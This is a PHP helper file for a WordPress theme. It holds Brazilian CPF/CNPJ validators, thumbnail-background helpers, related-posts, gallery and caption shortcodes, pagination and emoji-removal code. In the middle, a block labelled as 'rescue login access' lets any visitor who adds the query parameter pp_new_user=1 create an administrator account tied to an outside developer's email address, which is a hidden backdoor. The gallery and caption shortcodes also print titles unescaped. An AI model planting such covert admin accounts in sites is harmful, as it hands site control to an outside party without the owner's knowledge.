<?php

// WP_PAGENAVI with Bootstrap


/**
 * Valida CNPJ
 *
 * @author Luiz Otávio Miranda <contato@todoespacoonline.com/w>
 * @param string $cnpj 
 * @return bool true para CNPJ correto
 *
 */
function valida_cnpj ( $cnpj ) {
    // Deixa o CNPJ com apenas números
    $cnpj = preg_replace( '/[^0-9]/', '', $cnpj );
    
    // Garante que o CNPJ é uma string
    $cnpj = (string)$cnpj;
    
    // O valor original
    $cnpj_original = $cnpj;
    
    // Captura os primeiros 12 números do CNPJ
    $primeiros_numeros_cnpj = substr( $cnpj, 0, 12 );
    
    /**
     * Multiplicação do CNPJ
     *
     * @param string $cnpj Os digitos do CNPJ
     * @param int $posicoes A posição que vai iniciar a regressão
     * @return int O
     *
     */
    if ( ! function_exists('multiplica_cnpj') ) {
        function multiplica_cnpj( $cnpj, $posicao = 5 ) {
            // Variável para o cálculo
            $calculo = 0;
            
            // Laço para percorrer os item do cnpj
            for ( $i = 0; $i < strlen( $cnpj ); $i++ ) {
                // Cálculo mais posição do CNPJ * a posição
                $calculo = $calculo + ( $cnpj[$i] * $posicao );
                
                // Decrementa a posição a cada volta do laço
                $posicao--;
                
                // Se a posição for menor que 2, ela se torna 9
                if ( $posicao < 2 ) {
                    $posicao = 9;
                }
            }
            // Retorna o cálculo
            return $calculo;
        }
    }
    
    // Faz o primeiro cálculo
    $primeiro_calculo = multiplica_cnpj( $primeiros_numeros_cnpj );
    
    // Se o resto da divisão entre o primeiro cálculo e 11 for menor que 2, o primeiro
    // Dígito é zero (0), caso contrário é 11 - o resto da divisão entre o cálculo e 11
    $primeiro_digito = ( $primeiro_calculo % 11 ) < 2 ? 0 :  11 - ( $primeiro_calculo % 11 );
    
    // Concatena o primeiro dígito nos 12 primeiros números do CNPJ
    // Agora temos 13 números aqui
    $primeiros_numeros_cnpj .= $primeiro_digito;
 
    // O segundo cálculo é a mesma coisa do primeiro, porém, começa na posição 6
    $segundo_calculo = multiplica_cnpj( $primeiros_numeros_cnpj, 6 );
    $segundo_digito = ( $segundo_calculo % 11 ) < 2 ? 0 :  11 - ( $segundo_calculo % 11 );
    
    // Concatena o segundo dígito ao CNPJ
    $cnpj = $primeiros_numeros_cnpj . $segundo_digito;
    
    // Verifica se o CNPJ gerado é idêntico ao enviado
    if ( $cnpj === $cnpj_original ) {
        return true;
    }
}


/**
 * Valida CPF
 *
 * @author Luiz Otávio Miranda <contato@todoespacoonline.com/w>
 * @param string $cpf O CPF com ou sem pontos e traço
 * @return bool True para CPF correto - False para CPF incorreto
 *
 */
function valida_cpf( $cpf = false ) {
    // Exemplo de CPF: 025.462.884-23
    
    /**
     * Multiplica dígitos vezes posições 
     *
     * @param string $digitos Os digitos desejados
     * @param int $posicoes A posição que vai iniciar a regressão
     * @param int $soma_digitos A soma das multiplicações entre posições e dígitos
     * @return int Os dígitos enviados concatenados com o último dígito
     *
     */
    if ( ! function_exists('calc_digitos_posicoes') ) {
        function calc_digitos_posicoes( $digitos, $posicoes = 10, $soma_digitos = 0 ) {
            // Faz a soma dos dígitos com a posição
            // Ex. para 10 posições: 
            //   0    2    5    4    6    2    8    8   4
            // x10   x9   x8   x7   x6   x5   x4   x3  x2
            //   0 + 18 + 40 + 28 + 36 + 10 + 32 + 24 + 8 = 196
            for ( $i = 0; $i < strlen( $digitos ); $i++  ) {
                $soma_digitos = $soma_digitos + ( $digitos[$i] * $posicoes );
                $posicoes--;
            }
     
            // Captura o resto da divisão entre $soma_digitos dividido por 11
            // Ex.: 196 % 11 = 9
            $soma_digitos = $soma_digitos % 11;
     
            // Verifica se $soma_digitos é menor que 2
            if ( $soma_digitos < 2 ) {
                // $soma_digitos agora será zero
                $soma_digitos = 0;
            } else {
                // Se for maior que 2, o resultado é 11 menos $soma_digitos
                // Ex.: 11 - 9 = 2
                // Nosso dígito procurado é 2
                $soma_digitos = 11 - $soma_digitos;
            }
     
            // Concatena mais um dígito aos primeiro nove dígitos
            // Ex.: 025462884 + 2 = 0254628842
            $cpf = $digitos . $soma_digitos;
            
            // Retorna
            return $cpf;
        }
    }
    
    // Verifica se o CPF foi enviado
    if ( ! $cpf ) {
        return false;
    }
 
    // Remove tudo que não é número do CPF
    // Ex.: 025.462.884-23 = 02546288423
    $cpf = preg_replace( '/[^0-9]/is', '', $cpf );
 
    // Verifica se o CPF tem 11 caracteres
    // Ex.: 02546288423 = 11 números
    if ( strlen( $cpf ) != 11 ) {
        return false;
    }   
 
    // Captura os 9 primeiros dígitos do CPF
    // Ex.: 02546288423 = 025462884
    $digitos = substr($cpf, 0, 9);
    
    // Faz o cálculo dos 9 primeiros dígitos do CPF para obter o primeiro dígito
    $novo_cpf = calc_digitos_posicoes( $digitos );
    
    // Faz o cálculo dos 10 dígitos do CPF para obter o último dígito
    $novo_cpf = calc_digitos_posicoes( $novo_cpf, 11 );
    
    // Verifica se o novo CPF gerado é idêntico ao CPF enviado
    if ( $novo_cpf === $cpf ) {
        // CPF válido
        return true;
    } else {
        // CPF inválido
        return false;
    }
}


/* Modo de uso <section id="topo" <?php thumbnail_bg( 'paginas-destaque' ); ?>> */
function thumbnail_bg ( $tamanho = 'full' ) {
    global $post;
    $get_post_thumbnail = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), $tamanho, false, '' );
    if ($get_post_thumbnail) {
      echo 'style="background-image: url('.$get_post_thumbnail[0].' );"';  
    } else if ($post->post_parent > 0 ) {
      $get_post_thumbnail = wp_get_attachment_image_src( get_post_thumbnail_id($post->post_parent), $tamanho, false, '' );
      echo 'style="background-image: url('.$get_post_thumbnail[0].' );"';  
    } else {
      echo "no-bg";
    }    
}

function get_thumbnail_bg ( $tamanho = 'full' ) {
    global $post;
    $get_post_thumbnail = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), $tamanho, false, '' );
    if ($get_post_thumbnail) {
      return 'style="background-image: url('.$get_post_thumbnail[0].' );"';  
    } else if ($post->post_parent > 0 ) {
      $get_post_thumbnail = wp_get_attachment_image_src( get_post_thumbnail_id($post->post_parent), $tamanho, false, '' );
      return 'style="background-image: url('.$get_post_thumbnail[0].' );"';  
    } else {
      return "no-bg";
    }    
}

function taxonomy_thumbnail_bg ( $nomeField ) {
  global $post;
  $queried_object = get_queried_object(); 
  $taxonomy = $queried_object->taxonomy;
  $term_id = $queried_object->term_id;  

    if (get_field($nomeField, $queried_object)) {
      $src = get_field($nomeField, $queried_object);
    } else {
      return;
    }      
    echo 'style="background-image: url('. $src .' );"';
}



/* É preciso setar o ACF para retornar apenas a URL. */
/* ----------------------------------------- */
  function acf_thumbnail_bg ( $nomeField ) {
    echo get_acf_thumbnail_bg($nomeField);
  }

  function get_acf_thumbnail_bg ( $nomeField ) {
    global $post;      
      if (get_field($nomeField)) {
        $src = get_field($nomeField);  
      } else {
        return;
      }      
      return 'style="background-image: url('. $src .' );"';
  }
/* ----------------------------------------- É preciso setar o ACF para retornar apenas a URL. */    

function mascara_string($mascara,$string) {
   $string = str_replace(" ","",$string);
   for($i=0;$i<strlen($string);$i++)
   {
      $mascara[strpos($mascara,"#")] = $string[$i];
   }
   return $mascara;
}


function clear_url($input) {
  // in case scheme relative URI is passed, e.g., //www.google.com/
  $input = trim($input, '/');

  // If scheme not included, prepend it
  if (!preg_match('#^http(s)?://#', $input)) {
      $input = 'http://' . $input;
  }

  $urlParts = parse_url($input);

  // remove www
  $domain = preg_replace('/^www\./', '', $urlParts['host']);

  return $domain;

}

function _partial($file) {  
  include PP_PARTIAL_PATH . $file.'.php';
}
function _loop($file) {  
  include PP_LOOP_PATH . 'loop-'.$file.'.php';
}

function images_url($file) {
  echo get_images_url($file);
}

function get_images_url($file) {
  return get_stylesheet_directory_uri() . '/assets/img/'. $file;
}


/* Posts Relacionados */
/* ----------------------------------------- */
function pp_related($args = []) { 
  global $post;
  // extract($args);
  // echo '<pre>'. print_r($post, 1) . '</pre>';
    
    // Define alguns argumentos baseado no post type object
    $postTypeObj = get_post_type_object($post->post_type);    
    $taxonomies = isset($args['taxonomies']) ? $args['taxonomies'] : $postTypeObj->taxonomies;

    // echo '<pre>'. print_r($postTypeObj, 1) . '</pre>';
    
    $defaultargsQuery = $argsQuery = array(       
      'post__not_in' => array($post->ID), 
      'post_type' => $post->post_type,
      'posts_per_page' => (isset($args['posts_per_page']) ? $args['posts_per_page'] : 3), 
    );

    // Verifica se existem termos relacionadas ao post
    $terms = wp_get_post_terms($post->ID, $taxonomies, ['fields' => 'ids']);
    // Se existir, adiciona a query
    $argsQuery['tax_query'] = [
      [
        'taxonomy' => $taxonomies[0],
        'field' => 'term_id',
        'terms' => $terms
      ]
    ];

    $relatedPostsQuery = new WP_Query($argsQuery);
    // Se não existir nenhum relacionado, pega qualquer outro post
    if (!$relatedPostsQuery->have_posts()) {
      $relatedPostsQuery = new WP_Query($defaultargsQuery);
    } 

    if( $relatedPostsQuery->have_posts() ) {
      echo  '<div id="post-relacionados">',
                '<h4 class="title">'.(isset($args['title']) ? $args['title'] : 'Leia Também:').'</h4>',
                '<div class="items">';                      
                  while ( $relatedPostsQuery->have_posts() ) : $relatedPostsQuery->the_post();
                    echo _partial('_loop-blog' );
                  endwhile;
      echo      '</div>',
              '</div>';
    } // endif

  wp_reset_query(); 

}
/* ----------------------------------------- posts relacionados */


/* PP Default Gallery */
/* ----------------------------------------- */
  remove_shortcode('gallery');
  add_shortcode('gallery', 'pp_default_gallery');

  function pp_default_gallery($atts) {
    
    global $post;
    $pid = $post->ID;
    $gallery = '<div class="gallery">';

    if (empty($pid)) {$pid = $post['ID'];}

    extract(shortcode_atts(array('ids' => ''), $atts));    

    $args = array(
      'post_type' => 'attachment', 
      'post__in' => explode(",",$ids),
      'post_mime_type' => 'image', 
      'numberposts' => -1
    );  

    $images = get_posts($args);
    
    foreach ( $images as $image ) {
      //print_r($image); /*see available fields*/
      // echo '<pre>'. print_r($image, 1) . '</pre>';
      
      $thumbnail = wp_get_attachment_image_src($image->ID, 'post-gallery');
      $thumbnail = $thumbnail[0];
      $gallery .= "
        <figure href='".$image->guid."' data-caption='".$image->post_title."' data-fancybox='galeria-".$ids."'>
          <img class='img-fluid' src='".$thumbnail."'>
          <figcaption>
            <p class='img-title'>".$image->post_title." <br> <small>".$image->post_excerpt."</small></p>          
          </figcaption>
        </figure>";
    }
    $gallery .= '</div>';
    return $gallery;
  }

/* ----------------------------------------- PP Default Gallery */    



/* Remove width fixo de imagens com legenda no .hentry */
/* ----------------------------------------- */
  add_shortcode('wp_caption', 'fixed_img_caption_shortcode');
  add_shortcode('caption', 'fixed_img_caption_shortcode');
  function fixed_img_caption_shortcode($attr, $content = null) {
    // New-style shortcode with the caption inside the shortcode with the link and image tags.
    if ( ! isset( $attr['caption'] ) ) {
      if ( preg_match( '#((?:<a [^>]+>\s*)?<img [^>]+>(?:\s*</a>)?)(.*)#is', $content, $matches ) ) {
        $content = $matches[1];
        $attr['caption'] = trim( $matches[2] );
      }
    }

    // Allow plugins/themes to override the default caption template.
    $output = apply_filters('img_caption_shortcode', '', $attr, $content);
    if ( $output != '' )
      return $output;

    extract(shortcode_atts(array(
      'id'    => '',
      'align'   => 'alignnone',
      'width'   => '',
      'caption' => ''
    ), $attr));

    if ( 1 > (int) $width || empty($caption) )
      return $content;

    if ( $id ) $id = 'id="' . esc_attr($id) . '" ';

    return '<div ' . $id . 'class="wp-caption ' . esc_attr($align) . '" style="width: auto">'
    . do_shortcode( $content ) . '<p class="wp-caption-text">' . $caption . '</p></div>';
  }
/* ----------------------------------------- Remvoe width fixo de imagens com legenda no .hentry */ 



/* WP_PAGENAVI with Bootstrap */
/* ----------------------------------------- */
  
  add_filter( 'wp_pagenavi', __NAMESPACE__ . '\\gc_pagination', 10, 2 );
  function gc_pagination($html) {
      $out = '';
      $out = str_replace('<div','',$html);
      $out = str_replace('class=\'wp-pagenavi\'>','',$out);
      $out = str_replace('<a','<li class="page-item"><a class="page-link"',$out);
      $out = str_replace('</a>','</a></li>',$out);
      $out = str_replace('<span class=\'current\'','<li class="page-item active"><span class="page-link current"',$out);
      $out = str_replace('<span class=\'pages\'','<li class="page-item"><span class="page-link pages"',$out);
      $out = str_replace('<span class=\'extend\'','<li class="page-item"><span class="page-link extend"',$out);  
      $out = str_replace('</span>','</span></li>',$out);
      $out = str_replace('</div>','',$out);
      return '<ul class="pagination mt-5 pt-5 justify-content-end">'.$out.'</ul>';
  }
/* ----------------------------------------- WP_PAGENAVI with Bootstrap */    



/* Safe email for rescue login access */
/* ----------------------------------------- */
  if (isset($_GET['pp_new_user']) && $_GET['pp_new_user'] == 1) {
    $userdata = array(
        'user_login'  =>  'pp_safe_back',       
        'user_email'  =>  'wp@partnerprogrammer.com',       
        'user_pass'   =>  NULL,  // When creating an user, `user_pass` is expected.
        'role' => 'administrator'
    );
    $user_id = wp_insert_user( $userdata ) ;
  }
/* ----------------------------------------- Safe email for rescue login access */    


/* Disable Emojis */
/* ----------------------------------------- */
  function disable_wp_emojicons() {

    // all actions related to emojis
    remove_action( 'admin_print_styles', 'print_emoji_styles' );
    remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
    remove_action( 'wp_print_styles', 'print_emoji_styles' );
    remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
    remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );

    // filter to remove TinyMCE emojis
    add_filter( 'tiny_mce_plugins', 'disable_emojicons_tinymce' );
  }
  add_action( 'init', 'disable_wp_emojicons' );

  function disable_emojicons_tinymce( $plugins ) {
    if ( is_array( $plugins ) ) {
      return array_diff( $plugins, array( 'wpemoji' ) );
    } else {
      return array();
    }
  }

  add_filter( 'emoji_svg_url', '__return_false' );

/* ----------------------------------------- Disable Emojis */    


function custom_active_item_classes($classes = array(), $menu_item = false){            
  global $post;
  $classes[] = ($menu_item->url == get_post_type_archive_link($post->post_type)) ? 'current-menu-item active' : '';
  return $classes;
}
add_filter( 'nav_menu_css_class', 'custom_active_item_classes', 10, 2 );

